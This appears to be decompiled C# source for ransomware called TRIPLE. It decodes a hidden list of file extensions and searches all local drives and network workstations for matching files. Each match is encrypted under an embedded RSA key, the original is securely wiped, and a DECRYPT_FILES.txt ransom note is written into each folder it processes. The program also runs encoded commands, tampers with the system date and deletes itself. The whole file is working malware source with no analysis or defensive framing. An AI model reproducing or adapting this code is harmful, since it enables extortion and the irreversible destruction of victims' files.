using System;
using System.Collections;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TRIPLE;

internal static class Program
{
	private static string CorePriv;

	private static string CorePub;

	private static string CorePub2 = "<RSAKeyValue><Modulus>s0dCg6J8OrL63c+YDXWzaabkJ+9BB7rCCUVmpMLcWNLS68jlaf88qe3kZa0OsglfLXrJBXbdLMOgAIpdITQEiuSV0aDwV9UqlCT+GSgMgvE80YH++1PO1B6sMVWnM/MMhH6zYRBlmyft+TSzhHkl2SQqt2UbUzS/rp1hzTJ4ENDPVyRXi/maSl4PAcSktF+g9+fVWCK/LFNy5tNtItuB6BnPBm4qOKG8bo4nAwYnCdWTx9YcgSnfA53OCKlQ8iz2fcBOAR7CtQJyN5NjYr3qE3tbyqHZ4Y2xZuxQ9YoTSOlZZzf6HdeHdTNnrSMHcdVGY9k4fJ/peYTaQCdIVeRkZQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static string EncExt = "LkRDTSwuZGNtLC5mYmssLnNWbiwuc3ZuLC5mYmssLkZCSywuZGlzLC5BRFgsLmFkeCwuZnA3LC5GUDcsLkxERiwuTURGLC5sZGYsLm5kZiwubWRmLC50cm4sLmVyciwucGRmLC5teWksLm15ZCwuemlwLC5iYWssLmJrZiwucHJuLC5kYXRhLC5jdGYsLm1rZCwueml6LC5weGYsLmRzdCwuZXBzLC50bGYsLmx0ZiwuY2RyLC5wbWQsLmFpLC50eHQsLnFidywuUUJCLC5xYmIsLlFCVywuVExHLC5KUEcsLnRsZywuZWN3LC5wZGYsLkRCRiwuUERGLC5mcm0sLnBpeCwuYWNjZGIsLm1kYiwuY2RyLC5lcHMsLnRpZiwubXNnLC5hc214LC5ycHQsLmFydywucWJvLC5xYncsLnNsZHBydCwuZHdmLC5kb2MsLmFkaSwuYWR0LC5kb2N4LC5hbHRyLC54bHMsLnhsc3gsLnBwdCwucHB0eCwub2R0LC5qcGcsLnBuZywuY3N2LC5zcWwsc2xuLC5waHAsLmFzcCwuYXNweCwuaHRtbCwueG1sLC5wc2QsLmJhdCwuanMsLmNzcywuc3FsaXRlLC5kd2csLmpwZWcsLmRsbCwuc3FsaXRlLC5kYiwuY3J0LC5jcnlwdGVkLC5iYXQsLjAwMSwuMDAyLC4wMDMsLjAwNCwuMDA1LC4wMDYsLjAwNywuMDA4LC4wMDksLjAxMCwuRVRZLC5aVVIsLmV0eSwuenVyLC5EREYsLmRkZiwuYXNweCwuYXNwLC5waHA=";

	private static string EncExt2 = "LnZzdiwueG1sLC52aGR4LC5hdmhkeCwuYmlu";

	private static string PubKeyOffline = "<RSAKeyValue><Modulus>nZ+Tkw+sc+KOa6k0ztaTrX+oH8VnhiycQNRbOQu21lWhxJeOfdB+89Yw2w8Z3a2JxiZnRuHTRDriuYUiPp0pZM2JxJmoEe8zLMJ/DYA1WLf1tjpUObAy/E1DiADwrAjsfm3/e5QblZbpd9bAHiLaBGdC/toHiDP0oRuy+5hlWqFoZobMdfcz4dx0hqNOf75a43lq9otsRbKX86WU/LNSXni56woqRpAKDNgS/v7PwPmoHMlVZIFgQGiBGQrM3O5Uv9n79BC2eqNAmCI3xRMOM65PgI2O0A6pAIcPlgvXLDVsGa01pPGgYtOw1W/RW8doe4clmJvDQEWnEQJmaRuvhQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static string instructions;

	private static DateTime Datei = new DateTime(2050, 1, 1, 0, 0, 0);

	private static string IdentityID = Path.GetRandomFileName();

	public static bool IsAdministrator()
	{
		using WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(ntIdentity);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static string Base64Encode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static string CreateMD5(string input)
	{
		using MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(input);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}

	private static void PDExec(string grand_dir, string[] _array_ext)
	{
		string[] files = Directory.GetFiles(grand_dir);
		string[] directories = Directory.GetDirectories(grand_dir);
		for (int i = 0; i < files.Length; i++)
		{
			try
			{
				string extension = Path.GetExtension(files[i]);
				if (_array_ext.Contains(extension))
				{
					EMMMCore.EMMMCoreEnc(files[i], Path.GetDirectoryName(files[i]) + "\\" + CreateMD5(files[i]), Path.GetDirectoryName(files[i]) + "\\" + CreateMD5(files[i]) + ".info", CorePub2);
					wp.WipeFile(files[i], 4);
					func.setdatenew(Path.GetDirectoryName(files[i]) + "\\" + CreateMD5(files[i]));
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (Exception)
			{
			}
		}
		Parallel.ForEach(directories, delegate(string parent_dir)
		{
			try
			{
				if (!parent_dir.Contains("ProgramData") && !parent_dir.Contains("Program Files") && !parent_dir.Contains("Pictures") && !parent_dir.Contains("Music") && !parent_dir.Contains("Videos") && !parent_dir.Contains("Favorites") && !parent_dir.Contains("Package Cache") && !parent_dir.Contains("VMware") && !parent_dir.Contains("\\Microsoft\\") && !parent_dir.Contains("AppData") && !parent_dir.Contains("Program Files (x86)") && !parent_dir.Contains("Windows") && !parent_dir.Contains("Program Data") && !parent_dir.Contains("All Users") && !parent_dir.Contains("Users\\Default"))
				{
					PDExec(parent_dir, _array_ext);
					File.WriteAllText(parent_dir + "\\DECRYPT_FILES.txt", instructions);
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (Exception)
			{
			}
		});
	}

	private static void Main()
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		DriveInfo[] drives = DriveInfo.GetDrives();
		_ = WindowsIdentity.GetCurrent().Name;
		instructions = Base64Decode(addhelperinfo.infoz);
		string[] temp_ss = addhelperinfo.temp_ss;
		foreach (string base64EncodedData in temp_ss)
		{
			try
			{
				func.getlow(Base64Decode(base64EncodedData));
			}
			catch (Exception)
			{
			}
		}
		try
		{
			func.SetSystemDateEMMM();
		}
		catch (Exception)
		{
		}
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			MessageBox.Show(driveInfo.RootDirectory.ToString());
		}
		DriveInfo[] array2 = drives;
		foreach (DriveInfo driveInfo2 in array2)
		{
			try
			{
				PDExec(driveInfo2.RootDirectory.ToString(), Base64Decode(EncExt).Split(new char[1] { ',' }));
			}
			catch (IOException)
			{
			}
		}
		ArrayList serverList = lanwatch.GetServerList(lanwatch.SV_101_TYPES.SV_TYPE_WORKSTATION);
		foreach (string item in serverList)
		{
			try
			{
				PDExec("\\\\" + item + "\\", Base64Decode(EncExt).Split(new char[1] { ',' }));
			}
			catch (Exception)
			{
			}
		}
		string[] temp_ss2 = addhelperinfo.temp_ss2;
		foreach (string base64EncodedData2 in temp_ss2)
		{
			try
			{
				func.getlow(Base64Decode(base64EncodedData2));
			}
			catch (Exception)
			{
			}
		}
		func._self_delete();
	}
}
